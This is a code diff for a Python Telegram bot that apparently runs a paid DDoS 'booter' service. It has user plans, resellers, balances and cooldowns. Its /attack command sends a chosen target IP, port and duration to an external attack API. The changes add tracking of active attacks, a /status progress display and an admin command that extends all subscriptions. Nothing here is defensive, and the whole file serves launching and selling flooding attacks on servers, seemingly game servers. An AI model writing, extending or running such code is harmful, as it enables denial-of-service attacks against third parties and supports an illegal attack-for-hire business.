@@ -19,8 +19,6 @@ bot = telebot.TeleBot(BOT_TOKEN)
 
 ADMIN_IDS = {"7212246299"} # Ensure your ID is here
 
-# ⚠️ REPLACE THIS WITH YOUR ACTUAL API URL ⚠️
-# Use {ip}, {port}, and {time} as placeholders. The bot will automatically fill them in.
 ATTACK_API_URL = "http://YOUR_API_DOMAIN_OR_IP/api/attack?ip={ip}&port={port}&time={time}"
 
 USER_FILE        = "users.txt"
@@ -153,6 +151,9 @@ RESELLER_IDS: set      = read_resellers()
 balances: dict         = read_balances()
 bgmi_cooldown = {} 
 
+# NEW: Track active attacks for the /status command
+active_attacks = {} 
+
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 #  UTILITIES
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -175,7 +176,6 @@ def is_admin_or_reseller(uid: str) -> bool:
 def get_balance(uid: str) -> int:
     return balances.get(uid, 0)
 
-# Single-line log action
 def log_action(user_id: str, action: str, message=None):
     if message and message.from_user.username:
         username = f"@{message.from_user.username}"
@@ -270,11 +270,6 @@ def show_help(message):
         "  /admincmd → View admin panel\n"
         "━━━━━━━━━━━━━━━━━━━━━━"
     )
-
-@bot.message_handler(commands=['status'])
-def bot_status(message):
-    now = datetime.datetime.now(ist).strftime('%d %b %Y • %I:%M %p')
-    bot.reply_to(message, f"🟢 BOT STATUS\nStatus: Online ✅\nUptime: 24×7\nTime: {now}")
 
 @bot.message_handler(commands=['rules'])
 def show_rules(message):
@@ -497,7 +492,8 @@ def admin_commands(message):
         "👤 USER MANAGEMENT\n"
         "/add <id> <plan>      Add user\n"
         "/remove <id>          Remove user\n"
-        "/allusers             List users\n\n"
+        "/allusers             List users\n"
+        "/extendall <num> <unit> Extend ALL users\n\n"
         "🤝 RESELLER\n"
         "/addreseller <id>     Add reseller\n"
         "/rmreseller <id>      Remove reseller\n"
@@ -570,6 +566,54 @@ def show_all_users(message):
         expiry_info = f" [{fmt_expiry(user_access[uid]['expiry_time'])}]" if uid in user_access else " [No expiry]"
         lines.append(f"ID: {uid}{expiry_info}")
     bot.reply_to(message, "\n".join(lines)[:4000])
+
+@bot.message_handler(commands=['extendall'])
+def extend_all(message):
+    user_id = str(message.chat.id)
+    if not is_admin(user_id): return bot.reply_to(message, admin_only_msg())
+    
+    parts = message.text.split()
+    if len(parts) < 3:
+        return bot.reply_to(message, "Usage: /extendall <number> <hours/days>\nExample: /extendall 2 hours")
+    
+    try:
+        amount = int(parts[1])
+        unit = parts[2].lower()
+    except ValueError:
+        return bot.reply_to(message, "❌ Number must be an integer.")
+        
+    if "hour" in unit:
+        time_to_add = timedelta(hours=amount)
+        display_unit = f"{amount} hours"
+    elif "day" in unit:
+        time_to_add = timedelta(days=amount)
+        display_unit = f"{amount} days"
+    else:
+        return bot.reply_to(message, "❌ Unit must be 'hours' or 'days'.")
+
+    users_extended = 0
+    current_time = time.time()
+    
+    for uid in list(user_access.keys()):
+        # Only extend if they are currently active
+        if user_access[uid]["expiry_time"] > current_time:
+            # Add to their existing expiry time
+            current_expiry_dt = datetime.datetime.fromtimestamp(user_access[uid]["expiry_time"])
+            new_expiry_ts = (current_expiry_dt + time_to_add).timestamp()
+            user_access[uid]["expiry_time"] = new_expiry_ts
+            users_extended += 1
+            
+    save_user_access(user_access)
+    log_action(user_id, f"Extended all keys by {display_unit}", message)
+    
+    success_msg = (
+        f"🎉 <b>Time Extended for ALL Users!</b>\n\n"
+        f"⏰ <b>Added:</b> {display_unit}\n"
+        f"👥 <b>Users Updated:</b> {users_extended}\n\n"
+        f"Enjoy!"
+    )
+    bot.reply_to(message, success_msg, parse_mode="HTML")
+
 
 @bot.message_handler(commands=['addreseller'])
 def add_reseller(message):
@@ -670,26 +714,31 @@ def broadcast_reseller(message):
     execute_broadcast(message, list(RESELLER_IDS), "Broadcast to RESELLERS")
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  API ATTACK SYSTEM (Threaded)
+#  API ATTACK SYSTEM WITH LIVE STATUS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-def run_attack_api(chat_id, target, port, time_val):
-    # Format the URL with the user's inputs
+def clean_up_attack(user_id):
+    """Removes the attack from active_attacks when it finishes"""
+    if user_id in active_attacks:
+        del active_attacks[user_id]
+
+def run_attack_api(chat_id, user_id, target, port, time_val):
     api_url = ATTACK_API_URL.format(ip=target, port=port, time=time_val)
     
     try:
-        # Send request to the API
         response = requests.get(api_url, timeout=10)
-        
         if response.status_code == 200:
-            # If the API accepts it, we wait for the duration of the attack
+            # Wait for attack to finish
             time.sleep(time_val)
             bot.send_message(chat_id, f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 🚀\n\nTarget: {target}\nPort: {port}\nDuration: {time_val}s")
         else:
             bot.send_message(chat_id, f"⚠️ API Error: Server returned status {response.status_code}")
-            
-    except requests.exceptions.RequestException as e:
+    except requests.exceptions.RequestException:
         bot.send_message(chat_id, f"❌ Failed to reach the attack API. It might be offline.")
+    finally:
+        # Always clean up the active attack list when done
+        clean_up_attack(user_id)
+
 
 @bot.message_handler(commands=['attack'])
 def handle_bgmi(message):
@@ -718,17 +767,75 @@ def handle_bgmi(message):
 
         bgmi_cooldown[user_id] = datetime.datetime.now()
         
-        # Log it as a single line
+        # Save to active attacks for the /status command
+        active_attacks[user_id] = {
+            "target": f"{target}:{port}",
+            "start_time": time.time(),
+            "duration": time_val
+        }
+        
         log_action(user_id, f"Attack → IP: {target} | Port: {port} | Time: {time_val}s", message)
         
-        username = message.from_user.username if message.from_user.username else message.from_user.first_name
-        bot.reply_to(message, f"{username}, 🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱 via API 🚀\n\nTarget: {target}\nPort: {port}\nDuration: {time_val}s")
+        # New formatted attack response
+        attack_msg = (
+            f"⚡Attack Start!\n\n"
+            f"🎯 Target: {target}:{port}\n"
+            f"⏱️ Time: {time_val}s\n"
+            f"⏳ Cooldown after attack: 60s\n\n"
+            f"📊 /status se check kro..."
+        )
+        bot.reply_to(message, attack_msg)
         
-        # Run API request in background so bot doesn't freeze
-        threading.Thread(target=run_attack_api, args=(message.chat.id, target, port, time_val)).start()
+        # Run API request in background
+        threading.Thread(target=run_attack_api, args=(message.chat.id, user_id, target, port, time_val)).start()
 
     else:
         bot.reply_to(message, "✅ Usage: /attack [ip] [port] [time]")
+
+
+@bot.message_handler(commands=['status'])
+def attack_status(message):
+    total_active = len(active_attacks)
+    
+    status_msg = (
+        "╔══════════════════════════╗\n"
+        "║  🔥 ATTACK 𝗦𝗧𝗔𝗧𝗨𝗦  🔥        ║\n"
+        "╠══════════════════════════╣\n"
+        f"║  📊 Total Active: {total_active}               ║\n"
+        "╚══════════════════════════╝\n\n"
+    )
+
+    if total_active == 0:
+        status_msg += "No active attacks right now."
+    else:
+        current_time = time.time()
+        for uid, attack in active_attacks.items():
+            elapsed = current_time - attack["start_time"]
+            remaining = int(attack["duration"] - elapsed)
+            
+            # If for some reason it's stuck in the dictionary past duration
+            if remaining <= 0:
+                remaining = 0
+                percent = 100
+            else:
+                percent = int((elapsed / attack["duration"]) * 100)
+            
+            # Generate Progress Bar (10 circles total)
+            filled_circles = int(percent / 10)
+            empty_circles = 10 - filled_circles
+            progress_bar = ("🟢" * filled_circles) + ("⚫" * empty_circles)
+
+            status_msg += (
+                f"┌─────────────────────────┐\n"
+                f"│ 🎯 {attack['target']}\n"
+                f"│ ⏱️ {remaining}s remaining\n"
+                f"│ {progress_bar} {percent}%\n"
+                f"└─────────────────────────┘\n"
+            )
+            
+    status_msg += "\n⚙️ Max Time: 600s"
+    bot.reply_to(message, status_msg)
+
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 #  ENTRY POINT
